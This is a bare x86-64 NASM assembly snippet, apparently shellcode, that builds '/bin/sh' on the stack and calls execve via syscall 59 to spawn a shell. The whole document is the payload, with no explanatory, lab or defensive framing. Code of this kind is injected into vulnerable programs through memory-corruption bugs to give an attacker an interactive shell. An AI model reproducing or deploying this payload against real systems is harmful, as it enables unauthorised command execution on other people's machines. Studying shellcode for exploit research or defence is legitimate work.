BITS 64
    xor rdx, rdx
    mov rbx, `/bin/sh`
    push rbx
    mov rdi, rsp
    push rdx
    push rdi
    mov rsi, rsp
    mov rax, 59
    syscall
